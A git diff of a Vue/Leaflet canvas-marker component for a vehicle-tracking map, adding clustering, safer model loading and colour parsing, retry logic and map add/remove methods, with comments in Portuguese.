@@ -1,14 +1,19 @@
 <script>
 
-import {inject, onMounted, ref, provide,computed} from "vue";
-import {GLOBAL_LEAFLET_OPT, WINDOW_OR_GLOBAL} from "@vue-leaflet/vue-leaflet/src/utils";
-import {useStore} from "vuex";
+import { inject, onMounted, onBeforeUnmount, ref, provide, computed, watch } from "vue";
+import { GLOBAL_LEAFLET_OPT, WINDOW_OR_GLOBAL } from "@vue-leaflet/vue-leaflet/src/utils";
+import { useStore } from "vuex";
 
-export default{
+export default {
   name: 'Kore-CanvaMarker',
-  props: ['devices','zoom','map'],
+  props: {
+    devices: { type: [Array, Object], default: () => [] },
+    zoom: { type: Number, default: 10 },
+    map: { type: Object, default: null },
+    clustered: { type: Boolean, default: false },
+  },
   // eslint-disable-next-line no-unused-vars
-  setup(props,context){
+  setup(props, context) {
 
     const store = useStore();
 
@@ -24,12 +29,31 @@ export default{
 
     const markerList = ref([]);
 
+    // CLUSTER PATCH: Caches de markers e sistema de clustering
+    const markerById = ref(new Map());         // deviceId -> marker
+    const clusterByKey = ref(new Map());       // clusterKey -> marker cluster
+    const lastRenderToken = ref(0);
+    const clusterCanvasCache = new Map();
+
+    // Normalizar devices (Array, Object, {list: []})
+    const normalizeDevices = (input) => {
+      if (!input) return [];
+      if (Array.isArray(input)) return input;
+      if (typeof input === "object") {
+        if (Array.isArray(input.list)) return input.list;
+        return Object.values(input);
+      }
+      return [];
+    };
+
     const bases = {}
     const color1 = {}
     const color2 = {}
     const sizes = {};
     const radius = {};
     const cached = {};
+    // FIX: Track quando modelo está completo (base + color layers carregados)
+    const modelReady = {};
 
 
 
@@ -58,8 +82,8 @@ export default{
 
 
 
-    function loadModel(key,model,c1,c2,w,d=20) {
-      return new Promise((resolve)=> {
+    function loadModel(key, model, c1, c2, w, d = 20) {
+      return new Promise((resolve) => {
 
 
 
@@ -70,22 +94,26 @@ export default{
         sizes[key] = w;
         radius[key] = d;
 
-        bases[key].onload = ()=> {
+        bases[key].onload = () => {
           if (c1) {
             color1[key] = document.createElement('img');
             color1[key].src = '/img/cars/' + model + '_color1.png';
-            color1[key].onload = ()=>{
+            color1[key].onload = () => {
               if (c2) {
                 color2[key] = document.createElement('img');
                 color2[key].src = '/img/cars/' + model + '_color2.png';
-                color2[key].onload = ()=>{
+                color2[key].onload = () => {
+                  // FIX: Marcar modelo como pronto apenas quando tudo carregar
+                  modelReady[key] = true;
                   resolve();
                 }
-              }else{
+              } else {
+                modelReady[key] = true;
                 resolve();
               }
             }
-          }else{
+          } else {
+            modelReady[key] = true;
             resolve();
           }
         }
@@ -93,7 +121,7 @@ export default{
     }
 
 
-    function generateCachedName(name){
+    function generateCachedName(name) {
       var c = document.createElement('canvas');
       var ctx = c.getContext('2d');
 
@@ -106,17 +134,17 @@ export default{
       ctx.fillRect(0, 0, tSize, 20);
 
       ctx.fillStyle = 'white';
-      ctx.fillText(name, tSize/2, 13);
+      ctx.fillText(name, tSize / 2, 13);
 
 
-      return {c: c,width: tSize};
+      return { c: c, width: tSize };
     }
 
-    function generateCachedLabel(device){
+    function generateCachedLabel(device) {
 
       const name = device.name;
       const plate = device.attributes['placa'] || 'N/A';
-      const all = name+" - "+plate;
+      const all = name + " - " + plate;
 
 
       return {
@@ -127,196 +155,363 @@ export default{
 
     }
 
-    function generateCachedModel(key,h1,s1,b1,h2,s2,b2){
+    function generateCachedModel(key, h1, s1, b1, h2, s2, b2) {
 
-        if(!bases[key]){
-          return false;
-        }
-        var c = document.createElement('canvas');
+      if (!bases[key]) {
+        return null; // FIX: Retornar null ao invés de false
+      }
+      var c = document.createElement('canvas');
 
-        c.width = sizes[key];
-        c.height = sizes[key];
+      c.width = sizes[key];
+      c.height = sizes[key];
 
-        var ctx = c.getContext('2d');
+      var ctx = c.getContext('2d');
 
 
 
-        ctx.drawImage(bases[key], 0, 0, (sizes[key]), (sizes[key]));
+      ctx.drawImage(bases[key], 0, 0, (sizes[key]), (sizes[key]));
 
 
       /* IFTRUE_myFlag */
-        if(color1[key]) {
+      if (color1[key]) {
 
 
-          //c.style = 'filter: hue-rotate('+h1+'deg) saturate('+s1+') brightness('+b1+')';
-          ctx.filter = 'hue-rotate('+h1+'deg) saturate('+s1+') brightness('+b1+')';
-          ctx.drawImage(color1[key], 0, 0, (sizes[key]), (sizes[key]));
-        }
+        //c.style = 'filter: hue-rotate('+h1+'deg) saturate('+s1+') brightness('+b1+')';
+        ctx.filter = 'hue-rotate(' + h1 + 'deg) saturate(' + s1 + ') brightness(' + b1 + ')';
+        ctx.drawImage(color1[key], 0, 0, (sizes[key]), (sizes[key]));
+      }
 
-        if(color2[key]) {
-          ctx.filter = 'hue-rotate('+h2+'deg) saturate('+s2+') brightness('+b2+')';
-          ctx.drawImage(color2[key], 0, 0, (sizes[key]),(sizes[key]));
-        }
+      if (color2[key]) {
+        ctx.filter = 'hue-rotate(' + h2 + 'deg) saturate(' + s2 + ') brightness(' + b2 + ')';
+        ctx.drawImage(color2[key], 0, 0, (sizes[key]), (sizes[key]));
+      }
 
       /* FITRUE_myFlag */
 
-        return c;
+      // FIX: Resetar ctx.filter para não vazar para outros draws
+      ctx.filter = 'none';
+
+      return c;
     }
 
-    function getCachedModel(key,h1,s1,b1,h2,s2,b2){
+    function getCachedModel(key, h1, s1, b1, h2, s2, b2) {
 
-      const cKey = key+'|'+h1+'|'+s1+'|'+b1+'|'+h2+'|'+s2+'|'+b2;
+      const cKey = key + '|' + h1 + '|' + s1 + '|' + b1 + '|' + h2 + '|' + s2 + '|' + b2;
 
-
-
-
-      if(!cached[cKey]){
-          const tmp = generateCachedModel(key,h1,s1,b1,h2,s2,b2);
-
-          cached[cKey] = tmp;
+      // FIX: Não cachear se modelo ainda não está pronto
+      if (!modelReady[key]) {
+        return null;
       }
 
-      return cached[cKey];
+      if (!cached[cKey]) {
+        const tmp = generateCachedModel(key, h1, s1, b1, h2, s2, b2);
+        // FIX: Só cachear se tmp for um canvas válido (truthy)
+        if (tmp) {
+          cached[cKey] = tmp;
+        }
+      }
+
+      return cached[cKey] || null;
     }
 
 
 
     //const showName = ref(store.getters['mapPref']('name'));
     //const showPlate = ref(store.getters['mapPref']('plate'));
-    const showStatus =  computed(()=> store.getters['mapPref']('status'));
+    const showStatus = computed(() => store.getters['mapPref']('status'));
 
+    // CLUSTER PATCH: Funções de render e limpeza
+    const clearAllMarkers = () => {
+      // Remove markers individuais
+      for (const [, m] of markerById.value) {
+        try { if (m.remove) m.remove(); } catch (e) { /* cleanup */ }
+      }
+      markerById.value.clear();
+
+      // Remove markers cluster
+      for (const [, m] of clusterByKey.value) {
+        try { if (m.remove) m.remove(); } catch (e) { /* cleanup */ }
+      }
+      clusterByKey.value.clear();
+    };
+
+    const getGridSizePx = (zoom) => {
+      if (zoom >= 16) return 60;
+      if (zoom >= 14) return 70;
+      return 80;
+    };
+
+    const makeClusterCanvas = (count) => {
+      const label = count >= 100 ? "99+" : String(count);
+      const cacheKey = label;
+      if (clusterCanvasCache.has(cacheKey)) return clusterCanvasCache.get(cacheKey);
+
+      const size = 64;
+      const c = document.createElement("canvas");
+      c.width = size;
+      c.height = size;
+      const ctx = c.getContext("2d");
+
+      // Bolha azul
+      ctx.beginPath();
+      ctx.arc(size / 2, size / 2, 22, 0, Math.PI * 2);
+      ctx.fillStyle = "rgba(33,150,243,0.92)";
+      ctx.fill();
+
+      // Borda branca
+      ctx.lineWidth = 3;
+      ctx.strokeStyle = "rgba(255,255,255,0.9)";
+      ctx.stroke();
+
+      // Texto
+      ctx.font = "bold 16px Arial";
+      ctx.fillStyle = "#fff";
+      ctx.textAlign = "center";
+      ctx.textBaseline = "middle";
+      ctx.fillText(label, size / 2, size / 2);
+
+      clusterCanvasCache.set(cacheKey, c);
+      return c;
+    };
+
+    const addClusterMarker = (key, center, items) => {
+      const map = props.map;
+      if (!map) return;
+
+      const img = makeClusterCanvas(items.length);
+
+      const m = new L.CanvasMarker([center], [1000], {
+        minZoom: 0,
+        type: "cluster",
+        radius: 64,
+        id: `cluster:${key}`,
+        name: `${items.length} devices`,
+        img: {
+          canva: img,
+          showLabel: { name: false, plate: false, status: false },
+          cachedLabels: null,
+          hide: false,
+          hidden: false,
+          rSize: 0.5,
+          size: [64, 64],
+          rotate: 0,
+          offset: { x: 0, y: 0 },
+        },
+      }).on("click", () => {
+        const current = map.getZoom();
+        map.setView(center, Math.min(current + 2, 19), { animate: true });
+      });
+
+      addLayer({ ...props, leafletObject: m });
+      clusterByKey.value.set(key, m);
+    };
+
+    const renderClustered = (devices, token) => {
+      const map = props.map;
+      if (!map) return;
+      const zoom = props.zoom || map.getZoom();
+      const gridSize = getGridSizePx(zoom);
+
+      const buckets = new Map();
+
+      for (const d of devices) {
+        if (token !== lastRenderToken.value) return;
+
+        const posGetter = store.getters?.["devices/getPosition"];
+        const pos = typeof posGetter === "function" ? posGetter(d.id) : null;
+        if (!pos || pos.latitude == null || pos.longitude == null) continue;
+
+        const latlng = L.latLng(pos.latitude, pos.longitude);
+        const p = map.project(latlng, zoom);
+
+        const gx = Math.floor(p.x / gridSize);
+        const gy = Math.floor(p.y / gridSize);
+        const key = `${gx}:${gy}`;
+
+        if (!buckets.has(key)) buckets.set(key, []);
+        buckets.get(key).push({ d, latlng });
+      }
+
+      for (const [key, items] of buckets.entries()) {
+        if (token !== lastRenderToken.value) return;
+
+        if (items.length === 1) {
+          addDevice(items[0].d);
+          continue;
+        }
+
+        // Centro do cluster (média)
+        let sumLat = 0, sumLng = 0;
+        for (const it of items) {
+          sumLat += it.latlng.lat;
+          sumLng += it.latlng.lng;
+        }
+        const center = L.latLng(sumLat / items.length, sumLng / items.length);
+
+        addClusterMarker(key, center, items);
+      }
+    };
+
+    const renderIndividual = (devices, token) => {
+      for (const d of devices) {
+        if (token !== lastRenderToken.value) return;
+        addDevice(d);
+      }
+    };
+
+    const syncMarkers = async () => {
+      const map = props.map;
+      if (!map) return;
+
+      const devices = normalizeDevices(props.devices);
+      const token = ++lastRenderToken.value;
+
+      clearAllMarkers();
+
+      if (!devices.length) return;
+
+      if (props.clustered) {
+        renderClustered(devices, token);
+      } else {
+        renderIndividual(devices, token);
+      }
+    };
 
 
     onMounted(async () => {
-        L = useGlobalLeaflet
-          ? WINDOW_OR_GLOBAL.L
-          : await import("leaflet/dist/leaflet-src.esm");
+      L = useGlobalLeaflet
+        ? WINDOW_OR_GLOBAL.L
+        : await import("leaflet/dist/leaflet-src.esm");
 
-          L.interpolatePosition = function(p1, p2, duration, t) {
-            var k = t/duration;
-            k = (k > 0) ? k : 0;
-            k = (k > 1) ? 1 : k;
-            return L.latLng(p1.lat + k * (p2.lat - p1.lat),
-                p1.lng + k * (p2.lng - p1.lng));
-          };
-
-
-
-
-          L.Canvas.include({
-              _updateImg(layer) {
-                const { img } = layer.options;
-                const p = layer._point.round();
-
-
-                if(layer.options.type==='pointer'){
-                  if (img.rotate) {
-                    this._ctx.save();
-
-                    this._ctx.translate(p.x, p.y);
-                    this._ctx.rotate(img.rotate * Math.PI / 180);
-
-                    this._ctx.drawImage(point, -(20) / 2, -(20) / 2, (20), (20));
-
-
-                    this._ctx.restore();
-                  } else {
-
-                    this._ctx.save();
-                    this._ctx.translate(p.x, p.y);
-
-                    this._ctx.drawImage(point, -(20) / 2, -(20) / 2, (20), (20))
-                    this._ctx.restore();
-                  }
-                }else {
-
-
-
-                  const zFactor = (layer._map._zoom - 4) * 0.05;
-
-                  const status = layer.options.status || 'unknown';
-
-
-                  if (img.hide || img.hidden) {
-                    return false;
-                  }
-
-
-
-                    this._ctx.save();
-                    this._ctx.translate(p.x, p.y);
+      L.interpolatePosition = function (p1, p2, duration, t) {
+        var k = t / duration;
+        k = (k > 0) ? k : 0;
+        k = (k > 1) ? 1 : k;
+        return L.latLng(p1.lat + k * (p2.lat - p1.lat),
+          p1.lng + k * (p2.lng - p1.lng));
+      };
 
 
 
 
-
-                    /*
-                  if (layer.options.isCtrlPressed || showName.value || showPlate.value) {
-
-                    this._ctx.font = "11px Arial";
-                    this._ctx.textAlign = "center";
-
-                    let n = [];
-
-                    if(layer.options.isCtrlPressed || showName.value){
-                      n.push(layer.options.name);
-                    }
-
-                    if((layer.options.isCtrlPressed || showPlate.value) && store.state.devices.deviceList[layer.options.id].attributes['placa']){
-                      n.push(store.state.devices.deviceList[layer.options.id].attributes['placa']);
-                    }
-
-                    const tSize = (this._ctx.measureText(n.join(" - ")).width + 10);
-
-                    this._ctx.fillStyle = 'rgba(0,0,0,0.8)';
-                    this._ctx.fillRect(-((tSize) / 2), layer.options.radius - 50, tSize, 20);
+      L.Canvas.include({
+        _updateImg(layer) {
+          const { img } = layer.options;
+          const p = layer._point.round();
 
 
+          if (layer.options.type === 'pointer') {
+            if (img.rotate) {
+              this._ctx.save();
 
-                    this._ctx.fillStyle = 'white';
+              this._ctx.translate(p.x, p.y);
+              this._ctx.rotate(img.rotate * Math.PI / 180);
 
-                    this._ctx.fillText(n.join(" - "), 0, layer.options.radius - 36);
-                  }*/
-
-                  if (layer.options.isCtrlPressed || showStatus.value) {
-                    if (status === 'online') {
-                      this._ctx.drawImage(imgCircleGreen, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
-                    } else if (status === 'offline') {
-                      this._ctx.drawImage(imgCircleRed, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
-                    } else {
-                      this._ctx.drawImage(imgCircleYellow, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
-                    }
-
-                  }
-
-                    if(img.rotate) {
-                      this._ctx.rotate(img.rotate * Math.PI / 180);
-                    }
-
-                    //this._ctx.filter = 'hue-rotate(0deg) brightness(1) saturate(1)';
-
-                    this._ctx.drawImage(img.canva, -(img.size[0] * ((img.rSize + zFactor))) / 2, -(img.size[0] * ((img.rSize + zFactor))) / 2, (img.size[0] * ((img.rSize + zFactor))), (img.size[0] * ((img.rSize + zFactor))));
+              this._ctx.drawImage(point, -(20) / 2, -(20) / 2, (20), (20));
 
 
-                  if(layer.options.isCtrlPressed || img.showLabel.name || img.showLabel.plate){
-                    if(img.rotate) {
-                      this._ctx.rotate((-img.rotate) * Math.PI / 180);
-                    }
+              this._ctx.restore();
+            } else {
 
-                    if(layer.options.isCtrlPressed || (img.showLabel.name && img.showLabel.plate)) {
-                      this._ctx.drawImage(img.cachedLabels.all.c, -(img.cachedLabels.all.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
-                    }else if(img.showLabel.name) {
-                      this._ctx.drawImage(img.cachedLabels.name.c, -(img.cachedLabels.name.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
-                    }else if(img.showLabel.plate) {
-                      this._ctx.drawImage(img.cachedLabels.plate.c, -(img.cachedLabels.plate.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
-                    }
-                  }
+              this._ctx.save();
+              this._ctx.translate(p.x, p.y);
 
-                    this._ctx.restore();
+              this._ctx.drawImage(point, -(20) / 2, -(20) / 2, (20), (20))
+              this._ctx.restore();
+            }
+          } else {
 
-                }
-              },
-            });
+
+
+            const zFactor = (layer._map._zoom - 4) * 0.05;
+
+            const status = layer.options.status || 'unknown';
+
+
+            if (img.hide || img.hidden) {
+              return false;
+            }
+
+
+
+            this._ctx.save();
+            this._ctx.translate(p.x, p.y);
+
+
+
+
+
+            /*
+          if (layer.options.isCtrlPressed || showName.value || showPlate.value) {
+
+            this._ctx.font = "11px Arial";
+            this._ctx.textAlign = "center";
+
+            let n = [];
+
+            if(layer.options.isCtrlPressed || showName.value){
+              n.push(layer.options.name);
+            }
+
+            if((layer.options.isCtrlPressed || showPlate.value) && store.state.devices.deviceList[layer.options.id].attributes['placa']){
+              n.push(store.state.devices.deviceList[layer.options.id].attributes['placa']);
+            }
+
+            const tSize = (this._ctx.measureText(n.join(" - ")).width + 10);
+
+            this._ctx.fillStyle = 'rgba(0,0,0,0.8)';
+            this._ctx.fillRect(-((tSize) / 2), layer.options.radius - 50, tSize, 20);
+
+
+
+            this._ctx.fillStyle = 'white';
+
+            this._ctx.fillText(n.join(" - "), 0, layer.options.radius - 36);
+          }*/
+
+            if (layer.options.isCtrlPressed || showStatus.value) {
+              if (status === 'online') {
+                this._ctx.drawImage(imgCircleGreen, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
+              } else if (status === 'offline') {
+                this._ctx.drawImage(imgCircleRed, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
+              } else {
+                this._ctx.drawImage(imgCircleYellow, -(40 * (img.rSize + zFactor)) / 2, -(40 * (img.rSize + zFactor)) / 2, (40 * (img.rSize + zFactor)), (40 * (img.rSize + zFactor)));
+              }
+
+            }
+
+            if (img.rotate) {
+              this._ctx.rotate(img.rotate * Math.PI / 180);
+            }
+
+            // FIX: Verificar se canva existe antes de desenhar; usar placeholder se não
+            if (img.canva) {
+              this._ctx.drawImage(img.canva, -(img.size[0] * ((img.rSize + zFactor))) / 2, -(img.size[0] * ((img.rSize + zFactor))) / 2, (img.size[0] * ((img.rSize + zFactor))), (img.size[0] * ((img.rSize + zFactor))));
+            } else {
+              // Placeholder: desenhar contorno enquanto modelo não carrega
+              this._ctx.drawImage(imgContorno, -(img.size[0] * ((img.rSize + zFactor))) / 2, -(img.size[0] * ((img.rSize + zFactor))) / 2, (img.size[0] * ((img.rSize + zFactor))), (img.size[0] * ((img.rSize + zFactor))));
+            }
+
+
+            if (layer.options.isCtrlPressed || img.showLabel.name || img.showLabel.plate) {
+              if (img.rotate) {
+                this._ctx.rotate((-img.rotate) * Math.PI / 180);
+              }
+
+              if (layer.options.isCtrlPressed || (img.showLabel.name && img.showLabel.plate)) {
+                this._ctx.drawImage(img.cachedLabels.all.c, -(img.cachedLabels.all.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
+              } else if (img.showLabel.name) {
+                this._ctx.drawImage(img.cachedLabels.name.c, -(img.cachedLabels.name.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
+              } else if (img.showLabel.plate) {
+                this._ctx.drawImage(img.cachedLabels.plate.c, -(img.cachedLabels.plate.width) / 2, (img.size[0] * ((img.rSize + zFactor))) - 30);
+              }
+            }
+
+            this._ctx.restore();
+
+          }
+        },
+      });
 
 
       // eslint-disable-next-line no-unused-vars
@@ -335,51 +530,67 @@ export default{
       };
 
       L.CanvasMarker = L.CircleMarker.extend({
-        _containsPoint(p){
-          return p.distanceTo(this._point) <= this._radius -20;
+        _containsPoint(p) {
+          return p.distanceTo(this._point) <= this._radius - 20;
         },
         _updatePath() {
-            this._renderer._updateImg(this);
+          this._renderer._updateImg(this);
         },
-        updateCanva(d){
-
+        updateCanva(d) {
+          // FIX: Referência a 'this' para retry
+          const self = this;
 
 
           let car = d.category || 'car';
           let h1 = 0;
-          let s1 = 0;
+          let s1 = 1;  // FIX: Default 1 para saturate
           let b1 = 1.8;
           let h2 = 0;
-          let s2 = 0;
+          let s2 = 1;  // FIX: Default 1 para saturate
           let b2 = 1.8;
 
-
-          if(!bases[car]) {
+          // FIX: Fallback para 'car' se categoria não existe
+          if (!bases[car]) {
             car = 'car';
           }
+          // FIX: Fallback secundario para 'default' se 'car' também não existe
+          if (!bases[car]) {
+            car = 'default';
+          }
 
+          // FIX: Parse tarkan.color com parseFloat e valores default seguros
+          if (d.attributes['tarkan.color']) {
+            const tmp = d.attributes['tarkan.color'].split("-");
+            h1 = parseFloat(tmp[0]) || 0;
+            s1 = parseFloat(tmp[1]) || 1;
+            b1 = parseFloat(tmp[2]) || 1;
+          }
+          if (d.attributes['tarkan.color_extra']) {
+            const tmp = d.attributes['tarkan.color_extra'].split("-");
+            h2 = parseFloat(tmp[0]) || 0;
+            s2 = parseFloat(tmp[1]) || 1;
+            b2 = parseFloat(tmp[2]) || 1;
+          }
 
-            if(d.attributes['tarkan.color']){
-              const tmp = d.attributes['tarkan.color'].split("-");
-              h1 = tmp[0];
-              s1 = tmp[1];
-              b1 = tmp[2];
-            }
-            if(d.attributes['tarkan.color_extra']){
-              const tmp = d.attributes['tarkan.color_extra'].split("-");
-              h2 = tmp[0];
-              s2 = tmp[1];
-              b2 = tmp[2];
-            }
+          const model = getCachedModel(car, h1, s1, b1, h2, s2, b2);
 
-
-
-            const model = getCachedModel(car,h1,s1,b1,h2,s2,b2);
-
+          // FIX: Se modelo não está pronto, agendar retry
+          if (model) {
             this.options.img.canva = model;
-            this.options.img.size = [sizes[car],sizes[car]]
+          } else {
+            // Agendar retry em 300ms se modelo ainda não carregou
+            setTimeout(function () {
+              if (self && self.options && self.updateCanva) {
+                self.updateCanva(d);
+              }
+            }, 300);
+          }
 
-            this._updatePath();
+          // FIX: Fallback seguro para sizes
+          const safeSize = sizes[car] ?? 40;
+          this.options.img.size = [safeSize, safeSize];
+
+          this._updatePath();
         },
         statics: {
           notStartedState: 0,
@@ -397,7 +608,7 @@ export default{
           L.CircleMarker.prototype.initialize.call(this, latlngs[0], options);
 
           // eslint-disable-next-line no-unused-vars
-          this._latlngs = latlngs.map(function(e, index) {
+          this._latlngs = latlngs.map(function (e, index) {
             return L.latLng(e);
           });
 
@@ -421,23 +632,23 @@ export default{
         },
 
 
-        isRunning: function() {
+        isRunning: function () {
           return this._state === L.CanvasMarker.runState;
         },
 
-        isEnded: function() {
+        isEnded: function () {
           return this._state === L.CanvasMarker.endedState;
         },
 
-        isStarted: function() {
+        isStarted: function () {
           return this._state !== L.CanvasMarker.notStartedState;
         },
 
-        isPaused: function() {
+        isPaused: function () {
           return this._state === L.CanvasMarker.pausedState;
         },
 
-        start: function() {
+        start: function () {
           if (this.isRunning()) {
             return;
           }
@@ -451,8 +662,8 @@ export default{
           }
         },
 
-        resume: function() {
-          if (! this.isPaused()) {
+        resume: function () {
+          if (!this.isPaused()) {
             return;
           }
           // update the current line
@@ -461,8 +672,8 @@ export default{
           this._startAnimation();
         },
 
-        pause: function() {
-          if (! this.isRunning()) {
+        pause: function () {
+          if (!this.isRunning()) {
             return;
           }
 
@@ -472,42 +683,42 @@ export default{
           this._updatePosition();
         },
 
-        stop: function(elapsedTime) {
+        stop: function (elapsedTime) {
           if (this.isEnded()) {
             return;
           }
 
           this._stopAnimation();
 
-          if (typeof(elapsedTime) === 'undefined') {
+          if (typeof (elapsedTime) === 'undefined') {
             // user call
             elapsedTime = 0;
             this._updatePosition();
           }
 
           this._state = L.CanvasMarker.endedState;
-          this.fire('end', {elapsedTime: elapsedTime});
+          this.fire('end', { elapsedTime: elapsedTime });
         },
 
-        addLatLng: function(latlng, duration) {
+        addLatLng: function (latlng, duration) {
           this._latlngs.push(L.latLng(latlng));
           this._durations.push(duration);
         },
-        updateStatus: function(s){
+        updateStatus: function (s) {
           this._stopAnimation();
 
           this.options.status = s;
 
           //console.log(s);
-          if(this.options.isCtrlPressed) {
+          if (this.options.isCtrlPressed) {
             L.Util.requestAnimFrame(function () {
               this.redraw();
             }, this, false);
           }
         },
-        setPressed: function(s){
+        setPressed: function (s) {
           this._stopAnimation();
-          if(this.options.isCtrlPressed !== s) {
+          if (this.options.isCtrlPressed !== s) {
             this.options.isCtrlPressed = s;
 
             L.Util.requestAnimFrame(function () {
@@ -515,20 +726,20 @@ export default{
             }, this, false);
           }
         },
-        setLabel: function(l){
+        setLabel: function (l) {
           this._stopAnimation();
           this.options.img.showLabel = l;
-            L.Util.requestAnimFrame(function () {
-              this.redraw();
-            }, this, false);
+          L.Util.requestAnimFrame(function () {
+            this.redraw();
+          }, this, false);
         },
-        moveTo: function(latlng, duration) {
+        moveTo: function (latlng, duration) {
           this._stopAnimation();
 
 
-          if(!this._map || this._map._zoom<12 || !this._map.getBounds().contains(L.latLng(latlng))){
+          if (!this._map || this._map._zoom < 12 || !this._map.getBounds().contains(L.latLng(latlng))) {
             this.setLatLng(latlng);
-          }else {
+          } else {
             this._latlngs = [this.getLatLng(), latlng];
             this._durations = [duration];
             this._state = L.CanvasMarker.notStartedState;
@@ -536,16 +747,55 @@ export default{
             this.options.loop = false;
           }
         },
-        addToMap: function(){
+        addToMap: function () {
+          // FIX: Setar flags de visibilidade consistentes
+          this._stopAnimation();
+          this.options.isVisible = true;
+          if (this.options.img) {
+            this.options.img.hide = false;
+            this.options.img.hidden = false;
+          }
 
+          // FIX: Verificar se layer existe antes de adicionar
+          if (window.$hiddenLayer) {
+            window.$hiddenLayer.addLayer(this);
+          } else {
+            // Fallback: usar addLayer padrão
+            addLayer({
+              ...props,
+              leafletObject: this
+            });
+          }
 
-          addLayer({
-            ...props,
-            leafletObject: this
-          });
+          // Redesenhar após adicionar
+          if (this.redraw) {
+            this.redraw();
+          }
         },
 
-        addStation: function(pointIndex, duration) {
+        // FIX: Adicionar método removeFromMap consistente
+        removeFromMap: function () {
+          this._stopAnimation();
+          this.options.isVisible = false;
+          if (this.options.img) {
+            this.options.img.hide = true;
+            this.options.img.hidden = true;
+          }
+
+          if (window.$hiddenLayer) {
+            try {
+              window.$hiddenLayer.removeLayer(this);
+            } catch (e) {
+              // Silenciar erro se layer já foi removido
+            }
+          }
+
+          if (this.redraw) {
+            this.redraw();
+          }
+        },
+
+        addStation: function (pointIndex, duration) {
           if (pointIndex > this._latlngs.length - 2 || pointIndex < 1) {
             return;
           }
@@ -555,7 +805,7 @@ export default{
         onAdd: function (map) {
           L.CircleMarker.prototype.onAdd.call(this, map);
 
-          if (this.options.autostart && (! this.isStarted())) {
+          if (this.options.autostart && (!this.isStarted())) {
             this.start();
             return;
           }
@@ -565,7 +815,7 @@ export default{
           }
         },
 
-        onRemove: function(map) {
+        onRemove: function (map) {
           L.CircleMarker.prototype.onRemove.call(this, map);
           this._stopAnimation();
         },
@@ -593,9 +843,9 @@ export default{
           return durations;
         },
 
-        _startAnimation: function() {
+        _startAnimation: function () {
           this._state = L.CanvasMarker.runState;
-          this._animId = L.Util.requestAnimFrame(function(timestamp) {
+          this._animId = L.Util.requestAnimFrame(function (timestamp) {
             this._startTime = Date.now();
             this._startTimeStamp = timestamp;
             this._animate(timestamp);
@@ -603,28 +853,28 @@ export default{
           this._animRequested = true;
         },
 
-        _resumeAnimation: function() {
-          if (! this._animRequested) {
+        _resumeAnimation: function () {
+          if (!this._animRequested) {
             this._animRequested = true;
-            this._animId = L.Util.requestAnimFrame(function(timestamp) {
+            this._animId = L.Util.requestAnimFrame(function (timestamp) {
               this._animate(timestamp);
             }, this, true);
           }
         },
 
-        _stopAnimation: function() {
+        _stopAnimation: function () {
           if (this._animRequested) {
             L.Util.cancelAnimFrame(this._animId);
             this._animRequested = false;
           }
         },
 
-        _updatePosition: function() {
+        _updatePosition: function () {
           var elapsedTime = Date.now() - this._startTime;
           this._animate(this._startTimeStamp + elapsedTime, true);
         },
 
-        _loadLine: function(index) {
+        _loadLine: function (index) {
           this._currentIndex = index;
           this._currentDuration = this._durations[index];
           this._currentLine = this._latlngs.slice(index, index + 2);
@@ -636,7 +886,7 @@ export default{
          * @return {Number} elapsed time on the current line or null if
          * we reached the end or marker is at a station
          */
-        _updateLine: function(timestamp) {
+        _updateLine: function (timestamp) {
           // time elapsed since the last latlng
           var elapsedTime = timestamp - this._startTimeStamp;
 
@@ -670,7 +920,7 @@ export default{
 
               if (this.options.loop) {
                 lineIndex = 0;
-                this.fire('loop', {elapsedTime: elapsedTime});
+                this.fire('loop', { elapsedTime: elapsedTime });
               } else {
                 // place the marker at the end, else it would be at
                 // the last position
@@ -688,7 +938,7 @@ export default{
           return elapsedTime;
         },
 
-        _animate: function(timestamp, noRequestAnim) {
+        _animate: function (timestamp, noRequestAnim) {
           this._animRequested = false;
 
           // find the next line and compute the new elapsedTime
@@ -702,179 +952,234 @@ export default{
           if (elapsedTime != null) {
             // compute the position
             var p = L.interpolatePosition(this._currentLine[0],
-                this._currentLine[1],
-                this._currentDuration,
-                elapsedTime);
+              this._currentLine[1],
+              this._currentDuration,
+              elapsedTime);
             this.setLatLng(p);
           }
 
-          if (! noRequestAnim) {
+          if (!noRequestAnim) {
             this._animId = L.Util.requestAnimFrame(this._animate, this, false);
             this._animRequested = true;
           }
         }
       });
 
-
-
-
-
-
-
-
-
-
-
-
+      // 🎯 HANDSHAKE: Carregar modelos ao final do onMounted
+      try {
+        await window.loadModels();
+        window.__canvasMarkerReady = true; // Flag global
+        window.dispatchEvent(new CustomEvent('tarkan:canvasMarkerReady', {
+          detail: { loaded: true }
+        }));
+        console.log('✅ [CanvasMarkerReady] L.CanvasMarker e modelos carregados');
+      } catch (err) {
+        console.error('❌ [CanvasMarkerReady] Erro ao carregar modelos:', err);
+      }
 
     });
 
 
 
-    const addDevice = (d)=>{
-      //  slint-disable-next-line
